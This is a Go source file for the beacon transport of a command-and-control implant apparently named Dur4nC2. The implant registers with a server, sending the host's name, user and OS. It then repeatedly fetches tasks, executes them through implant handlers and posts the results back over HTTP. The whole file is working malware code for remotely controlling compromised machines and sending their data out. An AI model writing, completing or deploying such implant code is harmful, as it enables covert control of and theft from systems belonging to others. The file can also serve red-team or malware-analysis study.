package transport

import (
	"Dur4nC2/implant/handlers"
	"Dur4nC2/implant/modules/computer"
	"Dur4nC2/implant/modules/user"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/domain/models"
	"fmt"
	"google.golang.org/protobuf/proto"
	"math/rand"
	"time"
)

type Beacon struct {
	BeaconID       string
	HTTPConnection *ImplantHTTPClient
	Register       bool
}

func BeaconStart(config models.ImplantConfig) {
	for {
		beacon, err := HTTPBeacon(config)
		if err != nil {
			//setup reconnection
			fmt.Println("[implant] error: could not connect to the server")
		} else {
			err := beaconRegister(beacon)
			if err != nil {
				fmt.Println("[implant] error: could not register the beacon")
			} else {
				beaconLoop(beacon)
			}
		}
		time.Sleep(5 * time.Second)
	}
}

func beaconRegister(beacon *Beacon) error {
	fmt.Printf("[implant] beacon registration\n")
	register := implantpb.Register{
		Name:     computer.GetHostname(),
		Hostname: computer.GetHostname(),
		Username: user.GetWhoami(),
		Os:       computer.GetOS(),
	}
	beaconRegister := implantpb.BeaconRegister{
		Jitter:   5,
		Interval: 3,
		Register: &register,
	}
	registerData, err := proto.Marshal(&beaconRegister)
	if err != nil {
		return err
	}
	envelopeID := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	envelope := implantpb.Envelope{
		ID:   int64(envelopeID),
		Type: implantpb.MsgRegister,
		Data: registerData,
	}
	responseEnvelope, err := beacon.HTTPConnection.WriteEnvelope(&envelope)
	if err != nil {
		return err
	}
	beacon.BeaconID = string(responseEnvelope.Data)
	return nil
}
func beaconLoop(beacon *Beacon) {
	//tasks list
	var tasks []*implantpb.Envelope
	//tasks results
	var results []*implantpb.Envelope
	for {
		fmt.Println("[implant] Beaconing...")
		//execute tasks
		handlers := handlers.GetHandlers()
		for _, envelope := range tasks {
			fmt.Println("[implant] Handler")
			if handler, ok := handlers[envelope.Type]; ok {
				respEnvelope := handler(envelope)
				results = append(results, respEnvelope)
			}
		}
		tasks = tasks[:0]
		//send or retrieve tasks
		var (
			responseEnvelope *implantpb.Envelope
			err              error
		)
		if len(results) == 0 {
			// GET
			fmt.Println("[implant] Sending read envelope")
			responseEnvelope, err = beacon.HTTPConnection.ReadEnvelope(beacon.BeaconID)
		} else {
			//POST
			beaconTasks := &implantpb.BeaconTasks{
				ID:    beacon.BeaconID,
				Tasks: results,
			}
			var beaconTasksData []byte
			beaconTasksData, err = proto.Marshal(beaconTasks)
			envelopeResp := &implantpb.Envelope{
				Type: implantpb.MsgBeaconTasks,
				Data: beaconTasksData,
			}
			fmt.Println("[implant] Sending write envelope")
			responseEnvelope, err = beacon.HTTPConnection.WriteEnvelope(envelopeResp)
			results = results[:0]
		}
		if err != nil {
			fmt.Println("[implant] error in the task request")
			return
		}
		if responseEnvelope.Type == implantpb.MsgBeaconTasks {
			tasksEnvelope := &implantpb.BeaconTasks{}
			err := proto.Unmarshal(responseEnvelope.Data, tasksEnvelope)
			if err != nil {
				fmt.Println("[implant] error in the serialization")
			}
			tasks = append(tasks, tasksEnvelope.Tasks...)
		}
		fmt.Println("[implant] Sleep")
		time.Sleep(5 * time.Second)
	}
}
